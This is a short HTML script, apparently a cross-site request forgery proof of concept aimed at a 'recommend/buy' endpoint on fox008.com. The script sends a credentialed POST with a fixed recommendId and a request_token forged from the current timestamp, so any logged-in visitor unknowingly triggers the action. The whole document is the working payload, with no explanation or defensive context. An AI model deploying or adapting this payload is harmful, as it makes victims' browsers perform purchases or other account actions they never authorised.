<script type="text/javascript">
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  }

xmlhttp.withCredentials = true;
xmlhttp.open("POST","http://www.fox008.com/YP/recommend/buy?t="+String(new Date().getTime())+"&recommendId=888658&request_token="+String(new Date().getTime()),true);
xmlhttp.send(null);
</script>